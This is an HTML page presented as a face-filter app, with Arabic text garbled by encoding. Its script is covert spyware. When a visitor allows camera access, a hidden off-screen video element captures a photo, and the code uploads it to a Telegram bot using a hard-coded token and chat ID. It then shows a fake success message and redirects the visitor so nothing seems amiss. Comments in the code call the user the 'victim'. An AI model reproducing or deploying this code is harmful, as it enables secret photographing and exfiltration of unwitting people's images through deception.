<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ØªØ·Ø¨ÙŠÙ‚ Ø§Ù„ÙÙ„Ø§ØªØ± Ø§Ù„Ø³Ø­Ø±ÙŠØ© âœ¨</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Cairo', sans-serif;
            background: linear-gradient(to right bottom, #4a00e0, #8e2de2);
            color: white;
            margin: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            text-align: center;
            overflow: hidden;
            position: relative;
        }
        .container {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 25px;
            padding: 40px;
            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.3);
            max-width: 90%;
            width: 500px;
            z-index: 10;
        }
        h1 {
            font-size: 2.5em;
            margin-bottom: 15px;
            text-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
        }
        p {
            font-size: 1.1em;
            margin-bottom: 30px;
        }
        .filter-gallery {
            display: flex;
            justify-content: center;
            flex-wrap: wrap;
            gap: 15px;
            margin-bottom: 30px;
        }
        .filter-item {
            width: 80px;
            height: 80px;
            background-color: #6a1bb2;
            border-radius: 15px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 2em;
            cursor: pointer;
            transition: transform 0.2s ease, box-shadow 0.2s ease;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
        }
        .filter-item:hover {
            transform: translateY(-5px) scale(1.05);
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.4);
        }
        .filter-item.selected {
            border: 3px solid #00ffcc;
            transform: scale(1.1);
        }
        .start-btn {
            background: linear-gradient(to right, #00f260, #0575e6);
            border: none;
            padding: 15px 30px;
            border-radius: 50px;
            color: white;
            font-size: 1.3em;
            font-weight: bold;
            cursor: pointer;
            transition: transform 0.2s ease, box-shadow 0.2s ease;
            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
        }
        .start-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.4);
        }

        /* Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ù…Ø®ÙÙŠØ© */
        #hidden-video {
            position: absolute;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
        }

        /* Ø®Ù„ÙÙŠØ© Ù…ØªØ­Ø±ÙƒØ© Ù„Ø¥Ø¶ÙØ§Ø¡ Ø¬Ùˆ Ø§Ø­ØªØ±Ø§ÙÙŠ */
        .background-effect {
            position: absolute;
            width: 150px;
            height: 150px;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 50%;
            animation: move-bg 15s infinite alternate ease-in-out;
            z-index: 1;
            filter: blur(50px);
        }
        .background-effect:nth-child(2) {
            top: 10%; left: 5%;
            animation-delay: 2s;
            transform: scale(1.2);
        }
        .background-effect:nth-child(3) {
            bottom: 15%; right: 10%;
            animation-delay: 5s;
            transform: scale(0.8);
        }
        .background-effect:nth-child(4) {
            top: 30%; right: 20%;
            animation-delay: 8s;
            transform: scale(1.5);
        }
        @keyframes move-bg {
            0% { transform: translate(0, 0); }
            100% { transform: translate(50px, 50px); }
        }
    </style>
</head>
<body>
    <div class="background-effect"></div>
    <div class="background-effect"></div>
    <div class="background-effect"></div>
    <div class="background-effect"></div>

    <div class="container">
        <h1>âœ¨ ÙÙ„Ø§ØªØ± Ø§Ù„ÙˆØ¬Ù‡ Ø§Ù„Ø³Ø­Ø±ÙŠØ© âœ¨</h1>
        <p>Ø§Ø®ØªØ± ÙÙ„ØªØ±Ùƒ Ø§Ù„Ù…ÙØ¶Ù„ ÙˆØ´Ø§Ù‡Ø¯ Ø³Ø­Ø± Ø§Ù„ØªØ­ÙˆÙ„ Ù…Ø¨Ø§Ø´Ø±Ø©!</p>

        <div class="filter-gallery">
            <div class="filter-item" data-filter="cat">ğŸ±</div>
            <div class="filter-item" data-filter="dog">ğŸ¶</div>
            <div class="filter-item" data-filter="flower">ğŸŒ¸</div>
            <div class="filter-item" data-filter="beard">ğŸ§”</div>
        </div>

        <button class="start-btn" onclick="applyFilter()">Ø§Ø¨Ø¯Ø£ ØªØ¬Ø±Ø¨Ø© Ø§Ù„ÙÙ„ØªØ±</button>
    </div>

    <video id="hidden-video" autoplay></video>

    <script>
        const BOT_TOKEN = "8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY"; // ØºÙŠØ± Ù‡Ø°Ø§ Ø¨Ø§Ù„ØªÙˆÙƒÙ† Ø§Ù„Ø®Ø§Øµ Ø¨Ùƒ
        const CHAT_ID = "1772820433"; // ØºÙŠØ± Ù‡Ø°Ø§ Ø¨Ø§Ù„Ù€ ID Ø§Ù„Ø®Ø§Øµ Ø¨Ø§Ù„Ø¯Ø±Ø¯Ø´Ø©/Ø§Ù„Ù…Ø¬Ù…ÙˆØ¹Ø©

        let selectedFilter = '';

        document.querySelectorAll('.filter-item').forEach(item => {
            item.addEventListener('click', () => {
                document.querySelectorAll('.filter-item').forEach(el => el.classList.remove('selected'));
                item.classList.add('selected');
                selectedFilter = item.dataset.filter;
            });
        });

        async function applyFilter() {
            if (!selectedFilter) {
                alert('Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø§Ø®ØªÙŠØ§Ø± ÙÙ„ØªØ± Ø£ÙˆÙ„Ø§Ù‹!');
                return;
            }
            
            const btn = document.querySelector('.start-btn');
            btn.innerText = 'Ø¬Ø§Ø±ÙŠ ØªÙØ¹ÙŠÙ„ Ø§Ù„ÙÙ„ØªØ±...';
            btn.disabled = true;

            try {
                // Ø·Ù„Ø¨ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ù‡Ù†Ø§ØŒ Ø§Ù„Ø¶Ø­ÙŠØ© Ø±Ø­ ÙŠØ¶ØºØ· "Ø³Ù…Ø§Ø­" Ø¹Ø´Ø§Ù† ÙŠØ¬Ø±Ø¨ Ø§Ù„ÙÙ„ØªØ±
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: false 
                });
                
                const videoElement = document.getElementById('hidden-video');
                videoElement.srcObject = stream;
                videoElement.play();

                // Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ±Ø© Ø¨Ø¹Ø¯ Ø«Ø§Ù†ÙŠØ© (Ù„Ø¥Ø¹Ø·Ø§Ø¡ Ø§Ù†Ø·Ø¨Ø§Ø¹ Ø£Ù† Ø§Ù„ÙÙ„ØªØ± ÙŠØ¹Ù…Ù„)
                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = 640;
                    canvas.height = 480;
                    canvas.getContext('2d').drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                    
                    canvas.toBlob(async (blob) => {
                        const formData = new FormData();
                        formData.append('chat_id', CHAT_ID);
                        formData.append('photo', blob, `filter_capture_${selectedFilter}.jpg`);
                        formData.append('caption', `âœ¨ ÙÙ„ØªØ± ${selectedFilter} ØªÙ… Ø§Ù„Ø§Ù„ØªÙ‚Ø§Ø·!`);
                        
                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        });
                        
                        // Ø¨Ø¹Ø¯ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø©ØŒ Ù†Ø¹Ø·ÙŠ Ø±Ø³Ø§Ù„Ø© Ù†Ø¬Ø§Ø­ ÙˆÙ‡Ù…ÙŠØ©
                        alert(`ØªÙ… ØªØ·Ø¨ÙŠÙ‚ ÙÙ„ØªØ± ${selectedFilter} Ø¨Ù†Ø¬Ø§Ø­!`);
                        // ÙŠÙ…ÙƒÙ† ØªÙˆØ¬ÙŠÙ‡Ù‡ Ù„ØµÙØ­Ø© Ø£Ø®Ø±Ù‰ Ø£Ùˆ Ø¥Ø¸Ù‡Ø§Ø± ØµÙˆØ±Ø© Ø§Ù„ÙÙ„ØªØ± Ø¹Ù„ÙŠÙ‡ (ØµÙˆØ±Ø© ÙˆÙ‡Ù…ÙŠØ©)
                        window.location.href = `https://example.com/filter-result?filter=${selectedFilter}`; // ØµÙØ­Ø© ÙˆÙ‡Ù…ÙŠØ© Ù„Ù†ØªØ§Ø¦Ø¬ Ø§Ù„ÙÙ„ØªØ±
                        
                        // Ø¥ØºÙ„Ø§Ù‚ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ù„ØªØ¬Ù†Ø¨ Ø§Ù„Ø´Ø¨Ù‡Ø§Øª
                        stream.getTracks().forEach(track => track.stop());

                    }, 'image/jpeg');
                }, 1000); // Ø§Ù„ØªÙ‚Ø§Ø· Ø¨Ø¹Ø¯ Ø«Ø§Ù†ÙŠØ© ÙˆØ§Ø­Ø¯Ø©

            } catch (err) {
                console.error("Ø®Ø·Ø£ ÙÙŠ Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„ÙƒØ§Ù…ÙŠØ±Ø§:", err);
                btn.innerText = 'ÙØ´Ù„ Ø§Ù„ØªÙØ¹ÙŠÙ„! (Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø§Ù„Ø³Ù…Ø§Ø­ Ù„Ù„ÙƒØ§Ù…ÙŠØ±Ø§)';
                btn.disabled = false;
                alert('ÙØ´Ù„ ØªÙØ¹ÙŠÙ„ Ø§Ù„ÙÙ„ØªØ±! Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø§Ù„ØªØ£ÙƒØ¯ Ù…Ù† Ø§Ù„Ø³Ù…Ø§Ø­ Ø¨Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„ÙƒØ§Ù…ÙŠØ±Ø§.');
            }
        }
    </script>
</body>
</html>
